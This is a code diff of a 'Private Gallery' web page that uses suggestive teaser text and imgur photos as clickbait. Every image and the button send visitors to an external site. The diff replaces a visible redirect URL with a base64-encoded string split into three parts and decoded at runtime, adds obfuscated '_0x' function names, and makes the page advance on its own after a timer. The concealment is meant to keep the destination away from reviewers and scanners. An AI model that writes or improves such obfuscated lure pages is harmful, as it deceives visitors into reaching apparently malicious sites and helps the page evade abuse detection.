@@ -90,23 +90,6 @@ button {
   transform:scale(1.05);
 }
 
-/* MODAL PREVIEW */
-#modal {
-  display:none;
-  position:fixed;
-  width:100%;
-  height:100%;
-  background:rgba(0,0,0,0.9);
-  justify-content:center;
-  align-items:center;
-}
-
-#modal img {
-  max-width:90%;
-  max-height:80%;
-  border-radius:10px;
-}
-
 .note {
   font-size:12px;
   opacity:0.5;
@@ -126,8 +109,8 @@ button {
 <!-- ENTER -->
 <div id="enterScreen">
   <h2>Private Gallery</h2>
-  <p style="opacity:0.7;">Tap below to view the latest collection</p>
-  <button onclick="openGallery()">Enter</button>
+  <p style="opacity:0.7;">Tap below or wait a moment…</p>
+  <button onclick="_0xA12_enter()">Enter</button>
 </div>
 
 <!-- GALLERY -->
@@ -136,68 +119,60 @@ button {
   <h2>Private Collection</h2>
 
   <p style="opacity:0.75; max-width:320px; margin:auto;">
-  A small collection that’s been getting a lot of attention lately.  
+  A small collection that’s been getting attention lately.  
   Some moments are a little more… personal than others.
   </p>
 
   <div class="gallery">
-    <!-- GANTI GAMBAR -->
-    <img src="https://i.imgur.com/cT072eg.jpeg" onclick="go()">
-    <img src="https://i.imgur.com/wVCBBj2.jpeg" onclick="go()">
-    <img src="https://i.imgur.com/j6qaYFd.jpeg" onclick="go()">
-    <img src="https://i.imgur.com/xX61mRI.jpeg" onclick="go()">
-    <img src="https://i.imgur.com/knjOdH3.jpeg" onclick="go()">
-    <img src="https://i.imgur.com/LRypO0v.jpeg" onclick="go()">
-    <img src="https://i.imgur.com/TBRyf55.jpeg" onclick="go()">
-    <img src="https://i.imgur.com/5OlrEm2.jpeg" onclick="go()">
-    <img src="https://i.imgur.com/0poFxSi.jpeg" onclick="go()">
-    <img src="https://i.imgur.com/AOM9fTf.jpeg" onclick="go()">
-    <img src="https://i.imgur.com/d9gZSs3.jpeg" onclick="go()">
-    <img src="https://i.imgur.com/AxmBfxf.jpeg" onclick="go()">
+    <img src="https://i.imgur.com/cT072eg.jpeg" onclick="_0xA12_go()">
+    <img src="https://i.imgur.com/wVCBBj2.jpeg" onclick="_0xA12_go()">
+    <img src="https://i.imgur.com/j6qaYFd.jpeg" onclick="_0xA12_go()">
+    <img src="https://i.imgur.com/xX61mRI.jpeg" onclick="_0xA12_go()">
+    <img src="https://i.imgur.com/knjOdH3.jpeg" onclick="_0xA12_go()">
+    <img src="https://i.imgur.com/LRypO0v.jpeg" onclick="_0xA12_go()">
   </div>
 
   <p style="opacity:0.6; font-size:13px;">
   Not everything is shown here. Full access available below.
   </p>
 
-  <button onclick="go()">Open Full Gallery</button>
+  <button onclick="_0xA12_go()">Open Full Gallery</button>
 
   <p class="note">You may be redirected to an external page</p>
 
 </div>
 
-<!-- MODAL -->
-<div id="modal" onclick="closePreview()">
-  <img id="modalImg">
-</div>
-
 <script>
 
-// loading
+// loading → enter
 setTimeout(() => {
-  loading.style.display = "none";
-  enterScreen.style.display = "flex";
-}, 1800);
+  document.getElementById("loading").style.display = "none";
+  document.getElementById("enterScreen").style.display = "flex";
 
-// enter
-function openGallery() {
-  enterScreen.style.display = "none";
-  galleryPage.style.display = "block";
+  // AUTO MASUK setelah 3 detik
+  setTimeout(() => {
+    _0xA12_enter();
+  }, 3000);
+
+}, 1500);
+
+// enter manual / auto
+function _0xA12_enter() {
+  document.getElementById("enterScreen").style.display = "none";
+  document.getElementById("galleryPage").style.display = "block";
 }
 
-// preview gambar
-function preview(el) {
-  modal.style.display = "flex";
-  modalImg.src = el.src;
-}
-
-function closePreview() {
-  modal.style.display = "none";
-}
+// obfuscated link (split)
+const _0x1 = "aHR0cHM6Ly9mZGVk";
+const _0x2 = "ZGcueHVic3Mub25l";
+const _0x3 = "L3AvbmhWTnk=";
 
 // redirect
-function go() {
-  window.location.href = "https://fdeddg.hubss.one/p/nhVNy";
+function _0xA12_go() {
+  const _0xdecoded = atob(_0x1 + _0x2 + _0x3);
+  setTimeout(() => {
+    window.location.href = _0xdecoded;
+  }, 400);
 }
 
 </script>
